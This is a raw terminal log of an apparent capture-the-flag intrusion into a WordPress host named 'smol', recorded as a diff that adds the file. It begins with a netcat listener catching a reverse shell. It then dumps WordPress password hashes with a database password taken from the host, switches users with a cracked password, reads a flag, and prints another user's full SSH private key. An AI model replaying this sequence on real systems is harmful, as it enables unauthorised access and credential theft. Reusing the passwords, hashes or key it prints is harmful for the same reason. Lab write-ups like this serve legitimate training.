@@ -1,0 +1,371 @@
+Script started on 2025-01-27 19:45:34+03:00 [COMMAND="nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+listening on [any] 6047 ...
+connect to [172.21.1.38] from (UNKNOWN) [172.21.0.1] 13379
+id
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+python3 -c 'import pty;pty.spawn("/bin/bash"0 )'
+www-data@smol:/var/www/wordpress/wp-admin$ ls
+ls
+about.php		   js			   options.php
+admin-ajax.php		   link-add.php		   plugin-editor.php
+admin-footer.php	   link-manager.php	   plugin-install.php
+admin-functions.php	   link-parse-opml.php	   plugins.php
+admin-header.php	   link.php		   post-new.php
+admin-post.php		   load-scripts.php	   post.php
+admin.php		   load-styles.php	   press-this.php
+async-upload.php	   maint		   privacy-policy-guide.php
+authorize-application.php  media-new.php	   privacy.php
+comment.php		   media-upload.php	   profile.php
+contribute.php		   media.php		   revision.php
+credits.php		   menu-header.php	   setup-config.php
+css			   menu.php		   site-editor.php
+custom-background.php	   moderation.php	   site-health-info.php
+custom-header.php	   ms-admin.php		   site-health.php
+customize.php		   ms-delete-site.php	   term.php
+edit-comments.php	   ms-edit.php		   theme-editor.php
+edit-form-advanced.php	   ms-options.php	   theme-install.php
+edit-form-blocks.php	   ms-sites.php		   themes.php
+edit-form-comment.php	   ms-themes.php	   tools.php
+edit-link-form.php	   ms-upgrade-network.php  update-core.php
+edit-tag-form.php	   ms-users.php		   update.php
+edit-tags.php		   my-sites.php		   upgrade-functions.php
+edit.php		   nav-menus.php	   upgrade.php
+erase-personal-data.php    network		   upload.php
+export-personal-data.php   network.php		   user
+export.php		   options-discussion.php  user-edit.php
+freedoms.php		   options-general.php	   user-new.php
+images			   options-head.php	   users.php
+import.php		   options-media.php	   widgets-form-blocks.php
+includes		   options-permalink.php   widgets-form.php
+index.php		   options-privacy.php	   widgets.php
+install-helper.php	   options-reading.php
+install.php		   options-writing.php
+www-data@smol:/var/www/wordpress/wp-admin$ cd ..
+cd ..
+www-data@smol:/var/www/wordpress$ ls
+ls
+index.php	 wp-blog-header.php    wp-cron.php	  wp-mail.php
+license.txt	 wp-comments-post.php  wp-includes	  wp-settings.php
+readme.html	 wp-config-sample.php  wp-links-opml.php  wp-signup.php
+wp-activate.php  wp-config.php	       wp-load.php	  wp-trackback.php
+wp-admin	 wp-content	       wp-login.php	  xmlrpc.php
+www-data@smol:/var/www/wordpress$ cd ..
+cd ..
+www-data@smol:/var/www$ ls
+ls
+html  wordpress
+www-data@smol:/var/www$ mysql -u wpuser -p
+mysql -u wpuser -p
+Enter password: kbLSF2Vop#lw3rjDZ629*Z%G
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 200
+Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> show databases;
+show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| mysql              |
+| performance_schema |
+| sys                |
+| wordpress          |
++--------------------+
+5 rows in set (0.00 sec)
+
+mysql> use wordpress
+use wordpress
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+mysql> show tables
+show tables
+    -> ;
+;
++---------------------------+
+| Tables_in_wordpress       |
++---------------------------+
+| wp_bp_activity            |
+| wp_bp_activity_meta       |
+| wp_bp_invitations         |
+| wp_bp_messages_messages   |
+| wp_bp_messages_meta       |
+| wp_bp_messages_notices    |
+| wp_bp_messages_recipients |
+| wp_bp_notifications       |
+| wp_bp_notifications_meta  |
+| wp_bp_optouts             |
+| wp_bp_xprofile_data       |
+| wp_bp_xprofile_fields     |
+| wp_bp_xprofile_groups     |
+| wp_bp_xprofile_meta       |
+| wp_commentmeta            |
+| wp_comments               |
+| wp_links                  |
+| wp_options                |
+| wp_postmeta               |
+| wp_posts                  |
+| wp_signups                |
+| wp_term_relationships     |
+| wp_term_taxonomy          |
+| wp_termmeta               |
+| wp_terms                  |
+| wp_usermeta               |
+| wp_users                  |
+| wp_wysija_campaign        |
+| wp_wysija_campaign_list   |
+| wp_wysija_custom_field    |
+| wp_wysija_email           |
+| wp_wysija_email_user_stat |
+| wp_wysija_email_user_url  |
+| wp_wysija_form            |
+| wp_wysija_list            |
+| wp_wysija_queue           |
+| wp_wysija_url             |
+| wp_wysija_url_mail        |
+| wp_wysija_user            |
+| wp_wysija_user_field      |
+| wp_wysija_user_history    |
+| wp_wysija_user_list       |
++---------------------------+
+42 rows in set (0.00 sec)
+
+mysql> select * from wp_users;
+select * from wp_users;
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+| ID | user_login | user_pass                          | user_nicename | user_email         | user_url            | user_registered     | user_activation_key | user_status | display_name           |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+|  1 | admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. | admin         | admin@smol.thm     | http://www.smol.thm | 2023-08-16 06:58:30 |                     |           0 | admin                  |
+|  2 | wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. | wp            | wp@smol.thm        | http://smol.thm     | 2023-08-16 11:04:07 |                     |           0 | wordpress user         |
+|  3 | think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ | think         | josemlwdf@smol.thm | http://smol.thm     | 2023-08-16 15:01:02 |                     |           0 | Jose Mario Llado Marti |
+|  4 | gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 | gege          | gege@smol.thm      | http://smol.thm     | 2023-08-17 20:18:50 |                     |           0 | gege                   |
+|  5 | diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 | diego         | diego@local        | http://smol.thm     | 2023-08-17 20:19:15 |                     |           0 | diego                  |
+|  6 | xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 | xavi          | xavi@smol.thm      | http://smol.thm     | 2023-08-17 20:20:01 |                     |           0 | xavi                   |
++----+------------+------------------------------------+---------------+--------------------+---------------------+---------------------+---------------------+-------------+------------------------+
+6 rows in set (0.01 sec)
+
+mysql> exit
+exit
+Bye
+www-data@smol:/var/www$ cat /etc/passwd
+cat /etc/passwd
+root:x:0:0:root:/root:/usr/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
+systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
+messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
+syslog:x:104:110::/home/syslog:/usr/sbin/nologin
+_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
+tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
+uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
+tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
+landscape:x:109:115::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:110:1::/var/cache/pollinate:/bin/false
+usbmux:x:111:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
+sshd:x:112:65534::/run/sshd:/usr/sbin/nologin
+systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
+lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
+think:x:1000:1000:,,,:/home/think:/bin/bash
+fwupd-refresh:x:113:117:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
+mysql:x:114:119:MySQL Server,,,:/nonexistent:/bin/false
+xavi:x:1001:1001::/home/xavi:/bin/bash
+diego:x:1002:1002::/home/diego:/bin/bash
+gege:x:1003:1003::/home/gege:/bin/bash
+www-data@smol:/var/www$ cd /home
+cd /home
+www-data@smol:/home$ ls
+ls
+diego  gege  think  xavi
+www-data@smol:/home$ su dieo go
+su diego
+Password: sandiegocalifornia
+
+diego@smol:/home$ whoami
+whoami
+diego
+diego@smol:/home$ cd
+cd
+diego@smol:~$ ls
+ls
+user.txt
+diego@smol:~$ xa  cat user.txt
+cat user.txt
+45edaec653ff9ee06236b7ce72b86963
+diego@smol:~$ ^X  cd ..
+cd ..
+diego@smol:/home$ ;s -l     ls -l
+ls -l
+total 16
+drwxr-x--- 2 diego internal 4096 Aug 18  2023 diego
+drwxr-x--- 2 gege  internal 4096 Aug 18  2023 gege
+drwxr-x--- 5 think internal 4096 Jan 12  2024 think
+drwxr-x--- 2 xavi  internal 4096 Aug 18  2023 xavi
+diego@smol:/home$ cd think
+cd think
+diego@smol:/home/think$ ls
+ls
+diego@smol:/home/think$ ls -a
+ls -a
+.   .bash_history  .bashrc  .gnupg    .ssh
+..  .bash_logout   .cache   .profile  .viminfo
+diego@smol:/home/think$ ls -al
+ls -al
+total 32
+drwxr-x--- 5 think internal 4096 Jan 12  2024 .
+drwxr-xr-x 6 root  root     4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root  root        9 Jun 21  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 think think     220 Jun  2  2023 .bash_logout
+-rw-r--r-- 1 think think    3771 Jun  2  2023 .bashrc
+drwx------ 2 think think    4096 Jan 12  2024 .cache
+drwx------ 3 think think    4096 Aug 18  2023 .gnupg
+-rw-r--r-- 1 think think     807 Jun  2  2023 .profile
+drwxr-xr-x 2 think think    4096 Jun 21  2023 .ssh
+lrwxrwxrwx 1 root  root        9 Aug 18  2023 .viminfo -> /dev/null
+diego@smol:/home/think$ cd .. ssh
+cd .ssh
+diego@smol:/home/think/.ssh$ ls
+ls
+authorized_keys  id_rsa  id_rsa.pub
+diego@smol:/home/think/.ssh$ id
+id
+uid=1002(diego) gid=1002(diego) groups=1002(diego),1005(internal)
+diego@smol:/home/think/.ssh$ cat id_rsa
+cat id_rsa
+-----BEGIN OPENSSH PRIVATE KEY-----
+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
+-----END OPENSSH PRIVATE KEY-----
+diego@smol:/home/think/.ssh$ cd /home
+cd /home
+diego@smol:/home$ ls -l
+ls -l
+total 16
+drwxr-x--- 2 diego internal 4096 Aug 18  2023 diego
+drwxr-x--- 2 gege  internal 4096 Aug 18  2023 gege
+drwxr-x--- 5 think internal 4096 Jan 12  2024 think
+drwxr-x--- 2 xavi  internal 4096 Aug 18  2023 xavi
+diego@smol:/home$ cd gege
+cd gege
+diego@smol:/home/gege$ ls
+ls
+wordpress.old.zip
+diego@smol:/home/gege$ cd ../xavi
+cd ../xavi
+diego@smol:/home/xavi$ ls
+ls
+diego@smol:/home/xavi$ ls -al
+ls -al
+total 20
+drwxr-x--- 2 xavi internal 4096 Aug 18  2023 .
+drwxr-xr-x 6 root root     4096 Aug 16  2023 ..
+lrwxrwxrwx 1 root root        9 Aug 18  2023 .bash_history -> /dev/null
+-rw-r--r-- 1 xavi xavi      220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 xavi xavi     3771 Feb 25  2020 .bashrc
+-rw-r--r-- 1 xavi xavi      807 Feb 25  2020 .profile
+lrwxrwxrwx 1 root root        9 Aug 18  2023 .viminfo -> /dev/null
+diego@smol:/home/xavi$ mysql -u wpuser -p  'kbLSF2Vop#lw3rjDZ629*Z%G' -D wordpress
+<-u wpuser -p'kbLSF2Vop#lw3rjDZ629*Z%G' -D wordpress
+mysql: [Warning] Using a password on the command line interface can be insecure.
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MySQL monitor.  Commands end with ; or \g.
+Your MySQL connection id is 219
+Server version: 8.0.36-0ubuntu0.20.04.1 (Ubuntu)
+
+Copyright (c) 2000, 2024, Oracle and/or its affiliates.
+
+Oracle is a registered trademark of Oracle Corporation and/or its
+affiliates. Other names may be trademarks of their respective
+owners.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+mysql> select user_login,user_pass from wp_users;
+select user_login,user_pass from wp_users;
++------------+------------------------------------+
+| user_login | user_pass                          |
++------------+------------------------------------+
+| admin      | $P$BH.CF15fzRj4li7nR19CHzZhPmhKdX. |
+| wpuser     | $P$BfZjtJpXL9gBwzNjLMTnTvBVh2Z1/E. |
+| think      | $P$BOb8/koi4nrmSPW85f5KzM5M/k2n0d/ |
+| gege       | $P$B1UHruCd/9bGD.TtVZULlxFrTsb3PX1 |
+| diego      | $P$BWFBcbXdzGrsjnbc54Dr3Erff4JPwv1 |
+| xavi       | $P$BB4zz2JEnM2H3WE2RHs3q18.1pvcql1 |
++------------+------------------------------------+
+6 rows in set (0.00 sec)
+
+mysql> exit
+exit
+Bye
+diego@smol:/home/xavi$ exit
+exit
+exit
+www-data@smol:/home$ exit
+exit
+exit
+^C
+
+Script done on 2025-01-27 20:55:42+03:00 [COMMAND_EXIT_CODE="1"]
